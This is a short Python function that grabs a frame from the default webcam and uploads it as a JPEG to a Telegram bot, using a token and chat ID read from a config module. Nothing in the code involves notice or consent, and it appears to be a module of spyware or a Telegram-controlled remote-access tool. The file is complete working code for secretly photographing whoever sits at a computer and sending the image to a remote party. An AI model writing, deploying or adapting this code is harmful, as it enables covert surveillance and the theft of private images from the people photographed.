import cv2
import io
import requests
from config import get_telegram_config


def Captur_webcam():
    telegram_config = get_telegram_config()
    TOKEN = telegram_config['TOKEN']
    CHAT_ID = telegram_config['CHAT_ID']


    cap = cv2.VideoCapture(0)
    for i in range(30):
        cap.read()
    ret, frame = cap.read()
    
    buffer = io.BytesIO()
    
    _, encoded_image = cv2.imencode('.jpg', frame)
    buffer.write(encoded_image.tobytes())

    cap.release()

    archivos = {'photo': ('webcam.jpg', buffer.getvalue())}
    datos = {'chat_id': CHAT_ID}
    url = f'https://api.telegram.org/bot{TOKEN}/sendPhoto'

    respuesta = requests.post(url, data=datos, files=archivos)

    if respuesta.status_code == 200:
        print("Foto de la webcam enviada a Telegram")
    else:
        print("Error al enviar la foto a Telegram.")


